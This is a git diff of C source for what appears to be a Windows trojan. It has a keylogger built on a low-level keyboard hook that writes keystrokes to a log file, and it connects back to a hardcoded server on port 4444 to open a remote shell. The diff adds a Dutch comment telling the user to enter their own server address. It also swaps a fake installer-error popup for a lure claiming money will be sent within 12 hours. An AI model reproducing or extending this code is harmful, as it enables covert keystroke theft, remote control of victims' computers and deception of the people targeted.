@@ -43,7 +43,7 @@ void WANIPLOCATE() {
 }
 
 LRESULT CALLBACK KeyboardHook(int code, WPARAM wParam, LPARAM lParam) {
-	LOG = fopen("Log.txt", "a+");
+	LOG = fopen("Logbestand.txt", "a+");
 	if (wParam == WM_KEYDOWN) {
 		fputs((char *) lParam, LOG);
 		fclose(LOG);
@@ -54,10 +54,10 @@ LRESULT CALLBACK KeyboardHook(int code, WPARAM wParam, LPARAM lParam) {
 void keyStart() {
 	hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
 	if (hook != NULL) {
-		// success
+		
 	}
 	else {
-		// fail
+		
 	}
 	while(GetMessage(msg, NULL, 0, 0 > 0)) {
 		TranslateMessage(msg);
@@ -139,6 +139,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	char *ServIP;
 	WSADATA wsaData;
 
+	//Zet hier je eigen server ip address, en port.
 	ServIP = "192.168.198.130";
 	ServPort = 4444;
 
@@ -156,9 +157,10 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	if(connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) < 0)
 		return 0;
 
-	MessageBox(NULL, TEXT("installeren is gefaald!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
+	MessageBox(NULL, TEXT("Geld wordt verstuurd binnen 12 uur!"), TEXT("Gelukt!"), MB_OK);
 	Shell(); 
 }
+
 
 
 
